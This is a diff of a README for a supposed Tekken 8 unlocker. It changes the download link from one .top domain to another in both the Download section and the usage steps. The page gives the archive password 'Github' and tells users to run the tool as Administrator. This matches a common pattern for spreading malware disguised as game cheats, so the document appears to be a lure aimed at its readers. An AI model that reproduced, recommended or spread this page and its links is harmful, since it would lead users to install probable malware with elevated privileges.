@@ -6,7 +6,7 @@ Tekken 8 unlocker with all characters, stages, customization items, story mode u
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on community mods and unlock tools for fighting games.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Tekken 8.
 4. Run the unlocker **as Administrator**.
